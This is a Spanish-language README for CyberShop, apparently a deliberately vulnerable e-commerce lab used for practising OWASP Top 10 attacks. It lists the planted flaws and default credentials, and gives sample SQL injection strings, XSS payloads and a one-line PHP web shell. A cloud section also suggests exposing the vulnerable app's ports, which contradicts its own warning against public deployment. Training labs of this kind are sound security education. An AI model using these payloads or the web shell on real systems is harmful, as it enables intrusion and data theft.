# CyberShop - Laboratorio de Vulnerabilidades Web 🛡️

CyberShop es una aplicación web de e-commerce intencionalmente vulnerable, diseñada como un laboratorio para practicar y mejorar habilidades en seguridad web. Implementa las vulnerabilidades más comunes del OWASP Top 10.

## ⚠️ Advertencia de Seguridad

**¡IMPORTANTE!**: Esta aplicación es **INTENCIONALMENTE VULNERABLE** y está diseñada **ÚNICAMENTE** para propósitos educativos y de entrenamiento en un entorno controlado.

**NO DESPLEGAR EN PRODUCCIÓN O EN SERVIDORES PÚBLICOS**

## 🎯 Características

- Registro y autenticación de usuarios
- Catálogo de productos con búsqueda
- Carrito de compras
- Sistema de comentarios y reseñas
- Panel de administración
- API para integración móvil
- Sistema de subida de archivos

## 🔓 Vulnerabilidades Implementadas

1. **Broken Authentication**
   - Tokens débiles sin firma
   - Sesiones sin expiración
   - Sin límite de intentos de login

2. **Sensitive Data Exposure**
   - Contraseñas en texto plano
   - Datos sensibles en respuestas HTTP
   - Información de tarjetas sin cifrar

3. **SQL Injection**
   - Búsqueda de productos vulnerable
   - Filtros de administración sin sanitizar
   - Consultas directas a la base de datos

4. **Cross-Site Scripting (XSS)**
   - Comentarios sin sanitizar
   - Reseñas con scripts maliciosos
   - Perfiles con HTML inyectado

5. **Insecure Deserialization**
   - Carrito de compras vulnerable
   - Manipulación de cookies
   - Deserialización sin validación

6. **Insufficient Logging**
   - Sin registro de intentos fallidos
   - Actividades sospechosas no monitoreadas
   - Transacciones sin logging

7. **Broken Access Control**
   - IDOR en perfiles de usuario
   - Acceso a órdenes sin autorización
   - Escalación de privilegios

8. **Security Misconfiguration**
   - APIs internas expuestas
   - Configuraciones de desarrollo en producción
   - Headers de seguridad ausentes

9. **File Upload Vulnerabilities**
   - Subida de archivos PHP maliciosos
   - Ejecución de scripts en servidor
   - Sin validación de tipos

10. **API Security Issues**
    - Endpoints internos expuestos
    - Datos sensibles en respuestas JSON
    - Sin validación de solicitudes

## 🛠️ Requisitos del Sistema

- Docker
- Docker Compose
- Make
- Git

## 📦 Instalación

### Método Automatizado (Recomendado para Ubuntu)

Este método instalará automáticamente todas las dependencias y desplegará la aplicación. Hay dos modos de instalación disponibles:

#### Modo Evaluación (Por defecto)
Este modo es para realizar pruebas y evaluaciones iniciales, **no incluye la guía de vulnerabilidades**:
```bash
wget https://raw.githubusercontent.com/roozea/CyberShop/feature/vulnerable-app/install.sh
chmod +x install.sh
sudo ./install.sh
```

#### Modo Revisión (Con Guía)
Este modo es para después de la evaluación, **incluye la guía detallada de vulnerabilidades**:
```bash
wget https://raw.githubusercontent.com/roozea/CyberShop/feature/vulnerable-app/install.sh
chmod +x install.sh
sudo ./install.sh --with-guide
```

La guía de vulnerabilidades (VULNERABILITIES.md) en el modo revisión incluye:
- Descripción detallada de cada vulnerabilidad
- Pasos de reproducción
- Payloads de ejemplo
- Criterios de evaluación
- Impacto esperado

### Método Manual

1. Clonar el repositorio:
```bash
git clone https://github.com/roozea/CyberShop.git
cd CyberShop
```

2. Instalar la aplicación (esto configurará el entorno y desplegará todo):
```bash
make install
```

### Comandos Adicionales

```bash
make stop     # Detener la aplicación
make clean    # Limpiar contenedores y volúmenes
make dev      # Iniciar en modo desarrollo
```

## 🌐 Despliegue en la Nube (AWS/GCP/Azure)

Para desplegar en un servidor Ubuntu en la nube:

1. Conéctate a tu servidor:
```bash
ssh usuario@tu-servidor
```

2. Descarga y ejecuta el script de instalación:
```bash
wget https://raw.githubusercontent.com/roozea/CyberShop/feature/vulnerable-app/install.sh
chmod +x install.sh
sudo ./install.sh
```

⚠️ **Importante**: Asegúrate de configurar los grupos de seguridad/firewall para permitir el tráfico en los puertos 3000 (frontend) y 8000 (backend).

## 🎮 Uso

Una vez desplegada la aplicación, podrás acceder a:

- **Frontend**: http://localhost:3000
- **Backend API**: http://localhost:8000
- **Documentación API**: http://localhost:8000/docs

### Usuarios por defecto:
- **Administrador**:
  - Email: admin@cybershop.com
  - Password: admin123

- **Usuario normal**:
  - Email: user@cybershop.com
  - Password: user123

## 🔍 Ejemplos de Vulnerabilidades

### SQL Injection
```sql
' OR '1'='1
' UNION SELECT * FROM users--
```

### XSS
```javascript
<script>alert('XSS')</script>
<img src="x" onerror="alert('XSS')">
```

### File Upload
```php
<?php system($_GET['cmd']); ?>
```

### IDOR
```
/api/users/1/profile
/api/orders/2
```

## 📝 Makefile Commands

```makefile
make build    # Construir contenedores
make run      # Iniciar aplicación
make stop     # Detener aplicación
make clean    # Limpiar contenedores y volúmenes
make logs     # Ver logs de la aplicación
make shell    # Acceder al shell del contenedor backend
```

## 🤝 Contribución

Si encuentras bugs (no relacionados con las vulnerabilidades intencionales) o tienes sugerencias para mejorar el laboratorio, por favor abre un issue o envía un pull request.

## 📜 Licencia

Este proyecto está bajo la Licencia MIT. Ver el archivo [LICENSE](LICENSE) para más detalles.

## ⚠️ Descargo de Responsabilidad

Los autores de CyberShop no se hacen responsables del mal uso de esta aplicación. Este software está diseñado con fines educativos y de entrenamiento únicamente.
